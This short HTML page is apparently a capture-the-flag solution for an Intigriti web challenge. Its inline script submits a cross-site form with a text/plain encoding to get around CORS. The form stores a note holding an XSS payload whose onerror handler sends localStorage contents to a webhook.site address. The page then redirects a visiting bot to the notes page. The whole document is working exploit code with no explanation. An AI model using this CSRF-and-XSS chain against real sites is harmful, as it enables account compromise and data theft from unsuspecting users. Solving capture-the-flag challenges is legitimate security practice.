<html>
  <body>
    <script>
      // Step 1: Create note using form-based CSRF
      const form = document.createElement('form');
      form.action = 'https://challenge-0325.intigriti.io/api/post';
      form.method = 'POST';
      form.enctype = 'text/plain'; // Bypass CORS

      const payload = JSON.stringify({
        title: 'Leaky Flag',
        content: '&#x3C;img src=x onerror="fetch(\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=\\' + localStorage.getItem(\\'isAuthenticated\\'))" /&#x3E;',
        use_password: 'false'
      });

      const input = document.createElement('input');
      input.name = `_${payload.replace(/"/g, '\\"')}`; // Trick JSON parsing
      form.appendChild(input);

      document.body.appendChild(form);
      form.submit();

      // Step 2: Redirect to notes page (bot clicks note)
      setTimeout(() => {
        window.location.href = 'https://challenge-0325.intigriti.io/notes';
      }, 1000);
    </script>
  </body>
</html>
